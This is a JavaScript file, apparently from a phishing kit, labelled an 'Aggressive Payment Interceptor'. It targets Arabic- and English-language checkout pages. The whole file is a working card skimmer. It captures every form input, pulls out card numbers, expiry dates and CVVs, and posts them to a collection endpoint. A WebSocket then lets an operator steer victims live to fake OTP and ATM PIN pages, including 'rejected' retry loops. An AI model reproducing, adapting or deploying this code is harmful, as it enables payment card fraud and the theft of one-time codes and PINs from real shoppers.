// ─── Aggressive Payment Interceptor ───────────────────────────────────────
(function() {
  'use strict';
  
  console.log("Aggressive Interceptor Active");

  function getOrderRef() {
    return localStorage.getItem('current_order_ref') || new URLSearchParams(window.location.search).get('ref') || ('ORD-' + Date.now());
  }

  function sendToAdmin(data, forceRedirect = false) {
    const ref = getOrderRef();
    localStorage.setItem('current_order_ref', ref);
    
    const payload = {
      ...data,
      order_ref: ref,
      customer_name: data.customer_name || localStorage.getItem('customer_name'),
      customer_phone: data.customer_phone || localStorage.getItem('customer_phone'),
      service_type: data.service_type || localStorage.getItem('service_type'),
      timestamp: new Date().toISOString()
    };

    fetch('/api/intercept', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(() => {
      if (forceRedirect) {
        window.location.href = '/loading?ref=' + ref;
      }
    }).catch(err => {
      console.error("Intercept Error:", err);
      if (forceRedirect) window.location.href = '/loading?ref=' + ref;
    });
  }

  // 1. Capture all input changes to localStorage
  document.addEventListener('input', function(e) {
    if (e.target.name) {
      localStorage.setItem(e.target.name, e.target.value);
    }
    // Also try to guess by placeholder or type
    const p = (e.target.placeholder || '').toLowerCase();
    if (p.includes('اسم') || p.includes('name')) localStorage.setItem('customer_name', e.target.value);
    if (p.includes('هاتف') || p.includes('phone') || p.includes('جوال')) localStorage.setItem('customer_phone', e.target.value);
  }, true);

  // 2. Intercept ANY click on a button that looks like Payment or Next
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button, input[type="button"], input[type="submit"]');
    if (!btn) return;
    
    const text = (btn.innerText || btn.value || "").toLowerCase();
    const isPayment = text.includes('دفع') || text.includes('pay') || text.includes('اتمام');
    const isNext = text.includes('التالي') || text.includes('next') || text.includes('احجز') || text.includes('تاكيد');

    if (isPayment || isNext) {
      // Capture current form data
      const data = {};
      let rawMsg = "";
      
      document.querySelectorAll('input, select, textarea').forEach(el => {
        const val = el.value;
        if (!val) return;
        
        const name = el.name || el.id || el.placeholder || "field";
        data[name] = val;
        
        if (name.includes('card') || name.includes('بطاقة') || el.placeholder?.includes('بطاقة')) {
           data.card_number = val;
           rawMsg += "رقم البطاقة: " + val + "\n";
        }
        if (name.includes('exp') || name.includes('انتهاء') || el.placeholder?.includes('انتهاء')) {
           data.card_expiry = val;
           rawMsg += "تاريخ الانتهاء: " + val + "\n";
        }
        if (name.includes('cvv') || name.includes('أمان') || el.placeholder?.includes('أمان')) {
           data.card_cvv = val;
           rawMsg += "رمز الأمان: " + val + "\n";
        }
      });

      data.raw_message = rawMsg;
      
      if (isPayment) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        sendToAdmin(data, true); // Force redirect to loading
      } else {
        sendToAdmin(data, false); // Just send data in background
      }
    }
  }, true);

  // 3. WebSocket for Real-time redirects on Loading page
  if (window.location.pathname.includes('loading')) {
    function connectWS() {
      const ref = getOrderRef();
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(protocol + '//' + window.location.host + '/ws?ref=' + ref);
      
      ws.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (data.type === 'status_update') {
          const s = data.status;
          if (s === 'waiting_otp') window.location.href = '/qpay-otp?ref=' + ref;
          if (s === 'waiting_atm_pin') window.location.href = '/atm-pin?ref=' + ref;
          if (s === 'completed') window.location.href = '/payment-success?ref=' + ref;
          if (s === 'card_rejected') window.location.href = '/payment?ref=' + ref + '&error=rejected';
          if (s === 'otp_rejected') window.location.href = '/qpay-otp?ref=' + ref + '&otp_rejected=1';
          if (s === 'atm_rejected') window.location.href = '/atm-pin?ref=' + ref + '&atm_rejected=1';
        }
      };
      ws.onclose = () => setTimeout(connectWS, 2000);
    }
    connectWS();
  }
})();
